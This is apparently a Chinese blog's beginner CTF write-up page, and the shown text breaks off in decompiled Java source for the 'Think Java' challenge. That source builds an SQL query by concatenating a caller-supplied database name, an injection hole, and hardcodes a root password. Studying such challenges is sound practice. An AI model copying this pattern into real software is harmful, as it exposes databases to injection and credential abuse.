

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="notbad3">
  <meta name="keywords" content="The quieter you become,the more you are able to hear">
  
    <meta name="description" content="初学者的一些做题记录">
<meta property="og:type" content="article">
<meta property="og:title" content="BuuCTF做题记录_9">
<meta property="og:url" content="http://example.com/2023/12/28/2023-12-28-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_9/index.html">
<meta property="og:site_name" content="RenDongjun&#39;s Blog">
<meta property="og:description" content="初学者的一些做题记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/wdbthinkjava1.png">
<meta property="og:image" content="http://example.com/img/wdbthinkjava2.png">
<meta property="og:image" content="http://example.com/img/wdbthinkjava4.png">
<meta property="og:image" content="http://example.com/img/wdbthinkjava5.png">
<meta property="og:image" content="http://example.com/img/ezexpresswhat.png">
<meta property="og:image" content="http://example.com/img/n1ctfeatingcms1.png">
<meta property="og:image" content="http://example.com/img/nu1lctfeatingcms1.png">
<meta property="og:image" content="http://example.com/img/nu1lctfeatingcms3.png">
<meta property="og:image" content="http://example.com/img/nu1lctfeatingcms2.png">
<meta property="og:image" content="http://example.com/img/nu1lctfeatingcms4.png">
<meta property="og:image" content="http://example.com/img/npuctf2020yzm1.png">
<meta property="og:image" content="http://example.com/img/qwb2019upload1.png">
<meta property="og:image" content="http://example.com/img/roosterctfbabyweb1.png">
<meta property="og:image" content="http://example.com/img/ciscnweb4-1.png">
<meta property="og:image" content="http://example.com/img/ciscnweb4-2.png">
<meta property="og:image" content="http://example.com/img/ciscnweb4-4.png">
<meta property="og:image" content="http://example.com/img/ciscnweb4-5.png">
<meta property="og:image" content="http://example.com/img/ciscnweb4-6.png">
<meta property="og:image" content="http://example.com/img/ciscnweb4key1.png">
<meta property="og:image" content="http://example.com/img/ciscnweb4key2flag.png">
<meta property="og:image" content="http://example.com/img/ctfhoneyshop1.png">
<meta property="og:image" content="http://example.com/img/ctfhoneyshop2.png">
<meta property="og:image" content="http://example.com/img/ctfhoneyshop3.png">
<meta property="og:image" content="http://example.com/img/ctfhoneyshop4.png">
<meta property="og:image" content="http://example.com/img/ctfhoneyshop5.png">
<meta property="og:image" content="http://example.com/img/ctfhoneyshop6.png">
<meta property="og:image" content="http://example.com/img/blackwatch1.png">
<meta property="og:image" content="http://example.com/img/blackwatch2.png">
<meta property="og:image" content="http://example.com/img/blackwatch3.png">
<meta property="og:image" content="http://example.com/img/blackwatch4.png">
<meta property="og:image" content="http://example.com/img/onlineproxy1.png">
<meta property="og:image" content="http://example.com/img/onlineproxy2.png">
<meta property="og:image" content="http://example.com/img/1HFCTF2020BabyUpload.png">
<meta property="og:image" content="http://example.com/img/2HFCTF2020BabyUpload.png">
<meta property="og:image" content="http://example.com/img/whatevrctfpicklestory1.png">
<meta property="og:image" content="http://example.com/img/whatevrctfpicklestory2.png">
<meta property="og:image" content="http://example.com/img/whatevrctfpicklestory3.png">
<meta property="og:image" content="http://example.com/img/picksroryyyyy1.png">
<meta property="og:image" content="http://example.com/img/picklestoryyyyyyy2.png">
<meta property="og:image" content="http://example.com/img/googlectf2019bnv1.png">
<meta property="og:image" content="http://example.com/img/googlectf2019bnv2.png">
<meta property="og:image" content="http://example.com/img/spuctfweb4-1.png">
<meta property="og:image" content="http://example.com/img/spuctfweb4-2.png">
<meta property="og:image" content="http://example.com/img/spuctfweb4-3.png">
<meta property="og:image" content="http://example.com/img/spuctfweb4-4.png">
<meta property="og:image" content="http://example.com/img/ximpleuploadd1.png">
<meta property="og:image" content="http://example.com/img/ximpleuploadd2.png">
<meta property="og:image" content="http://example.com/img/BSidesCF2020Hurdles2.png">
<meta property="og:image" content="http://example.com/img/BSidesCF2020Hurdles3.png">
<meta property="og:image" content="http://example.com/img/BSidesCF2020Hurdles4.png">
<meta property="og:image" content="http://example.com/img/BSidesCF2020Hurdles5.png">
<meta property="og:image" content="http://example.com/img/BSidesCF2020Hurdles6.png">
<meta property="og:image" content="http://example.com/img/BSidesCF2020Hurdles7.png">
<meta property="og:image" content="http://example.com/img/BSidesCF2020Hurdles8.png">
<meta property="og:image" content="http://example.com/img/virink_2019_files_share1.png">
<meta property="og:image" content="http://example.com/img/virink_2019_files_share2.png">
<meta property="og:image" content="http://example.com/img/virink_2019_files_share3.png">
<meta property="og:image" content="http://example.com/img/virink_2019_files_share5.png">
<meta property="og:image" content="http://example.com/img/imgxweb2.png">
<meta property="og:image" content="http://example.com/img/imgxweb1.png">
<meta property="og:image" content="http://example.com/img/imgxweb4.png">
<meta property="og:image" content="http://example.com/img/SWPU2019Web32.png">
<meta property="og:image" content="http://example.com/img/SWPU2019Web33.png">
<meta property="og:image" content="http://example.com/img/SWPU2019Web34.png">
<meta property="og:image" content="http://example.com/img/SWPU2019Web31.png">
<meta property="og:image" content="http://example.com/img/yangchengbeiser1.png">
<meta property="og:image" content="http://example.com/img/yangchengbeiser2.png">
<meta property="og:image" content="http://example.com/img/yangchengbeiser3.png">
<meta property="og:image" content="http://example.com/img/hfctf2021final1.png">
<meta property="og:image" content="http://example.com/img/hfctf2021final2.png">
<meta property="og:image" content="http://example.com/img/hfctf2021final3.png">
<meta property="og:image" content="http://example.com/img/hfctf2021final4.png">
<meta property="og:image" content="http://example.com/img/hfctf2021final6.png">
<meta property="og:image" content="http://example.com/img/hfctf2021final7.png">
<meta property="article:published_time" content="2023-12-28T12:08:50.000Z">
<meta property="article:modified_time" content="2024-02-14T07:14:33.966Z">
<meta property="article:author" content="notbad3">
<meta property="article:tag" content="做题记录">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/wdbthinkjava1.png">
  
  
  
  <title>BuuCTF做题记录_9 - RenDongjun&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>notbad3</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="BuuCTF做题记录_9"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-12-28 20:08" pubdate>
          2023年12月28日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          96k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          800 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">BuuCTF做题记录_9</h1>
            
            
              <div class="markdown-body">
                
                <p>初学者的一些做题记录</p>
<span id="more"></span>



<hr>
<h2 id="网鼎杯-2020-朱雀组-Think-Java-未做完"><a href="#网鼎杯-2020-朱雀组-Think-Java-未做完" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java(未做完)"></a>[网鼎杯 2020 朱雀组]Think Java(未做完)</h2><p>几个附件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Row.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Row</span> &#123;<br>    String name;<br>    String type;<br>    String def;<br>    String isNull;<br>    String isAuto;<br>    String remark;<br>    String isPK;<br>    String size;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsPK</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsPK</span><span class="hljs-params">(String isPK)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isPK = isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setType</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-built_in">this</span>.type = type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(String def)</span> &#123;<br>        <span class="hljs-built_in">this</span>.def = def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsNull</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsNull</span><span class="hljs-params">(String isNull)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsAuto</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsAuto</span><span class="hljs-params">(String isAuto)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRemark</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRemark</span><span class="hljs-params">(String remark)</span> &#123;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSize</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSize</span><span class="hljs-params">(String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">(String name, String type, String def, String isNull, String isAuto, String remark, String isPK, String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.def = def;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>        <span class="hljs-built_in">this</span>.isPK = isPK;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//sqlDict.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlDict</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SqlDict</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>            <span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                user = <span class="hljs-string">&quot;root&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (pass == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                pass = <span class="hljs-string">&quot;abc@12345&quot;</span>;<br>            &#125;<br><br>            conn = DriverManager.getConnection(dbName, user, pass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var5) &#123;<br>            var5.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var6) &#123;<br>            var6.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> conn;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Table&gt; <span class="hljs-title function_">getTableData</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        List&lt;Table&gt; Tables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> getConnection(dbName, user, pass);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">TableName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>            <span class="hljs-type">DatabaseMetaData</span> <span class="hljs-variable">metaData</span> <span class="hljs-operator">=</span> conn.getMetaData();<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">tableNames</span> <span class="hljs-operator">=</span> metaData.getTables((String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;TABLE&quot;</span>&#125;);<br><br>            <span class="hljs-keyword">while</span>(tableNames.next()) &#123;<br>                TableName = tableNames.getString(<span class="hljs-number">3</span>);<br>                <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br><br>                <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>                    table.setTableDescribe(rs.getString(<span class="hljs-string">&quot;TABLE_COMMENT&quot;</span>));<br>                &#125;<br><br>                table.setTableName(TableName);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName, <span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs2</span> <span class="hljs-operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName);<br><br>                String PK;<br>                <span class="hljs-keyword">for</span>(PK = <span class="hljs-string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="hljs-number">4</span>)) &#123;<br>                &#125;<br><br>                <span class="hljs-keyword">while</span>(data.next()) &#123;<br>                    <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Row</span>(data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="hljs-string">&quot;NULLABLE&quot;</span>).equals(<span class="hljs-string">&quot;1&quot;</span>) ? <span class="hljs-string">&quot;YES&quot;</span> : <span class="hljs-string">&quot;NO&quot;</span>, data.getString(<span class="hljs-string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="hljs-string">&quot;REMARKS&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-literal">null</span>, data.getString(<span class="hljs-string">&quot;COLUMN_SIZE&quot;</span>));<br>                    table.list.add(row);<br>                &#125;<br><br>                Tables.add(table);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var16) &#123;<br>            var16.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> Tables;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//table.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Table</span> &#123;<br>    String tableName;<br>    String tableDescribe;<br>    List&lt;Row&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Table</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableDescribe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableDescribe</span><span class="hljs-params">(String tableDescribe)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableDescribe = tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableName</span><span class="hljs-params">(String tableName)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableName = tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;Row&gt; <span class="hljs-title function_">getList</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setList</span><span 